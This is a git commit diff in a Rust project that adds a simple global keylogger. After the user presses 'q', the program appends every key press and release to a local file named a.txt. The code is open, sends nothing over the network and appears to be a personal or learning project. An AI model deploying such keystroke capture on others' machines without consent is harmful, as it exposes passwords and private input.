45a5c16bfb5af618ab95b58d25bc42112dd2bead
Sonja-With-A-Y <sonyalowdon@protonmail.com>
2023-04-19 02:09:46 +0100

    Keylogging begins upon pressing hotkey and is recorded in a somewhat useable format.

--- src/main.rs
+++ src/main.rs
@@ -1,14 +1,45 @@
-extern crate evdev_rs as evdev;
-use enigo::*;
+use std::fs::{File, OpenOptions};
+use std::io::Write;
+
+use rdev::EventType::{KeyPress, KeyRelease};
+use rdev::{listen, Event, EventType};
 
 fn main() {
-    let mut enigo = Enigo::new();
+    if let Err(error) = listen(idle) {
+        println!("Error: {:?}", error)
+    }
+}
 
-    enigo.key_down(Key::Layout('s'));
-    enigo.key_click(Key::Layout('l'));
-    enigo.key_up(Key::Layout('s'));
+fn idle(event: Event) {
+    match event.name {
+        Some(string) => if string == "q" {record()},
+        _ => (),
+    }
+}
 
-    enigo.key_down(Key::RControl);
-    enigo.key_click(Key::Layout('t'));
-    enigo.key_up(Key::RControl);
+fn record() {
+    File::create("a.txt").expect("File creation failed");
+
+    if let Err(error) = listen(callback) {
+        println!("Error: {:?}", error)
+    }
+}
+
+fn callback(event: Event) {
+
+    let f = OpenOptions::new()
+        .append(true)
+        .open("a.txt")
+        .expect("Cannot open file");
+
+    match event.event_type {
+
+        KeyPress(_) => log(f, event.event_type),
+        KeyRelease(_) => log(f,  event.event_type),
+        _ => {}
+    };
+}
+
+fn log(mut f: File, pressed_or_released: EventType) {
+    f.write(format!("{:?}\n", pressed_or_released).as_bytes()).expect("idk");
 }
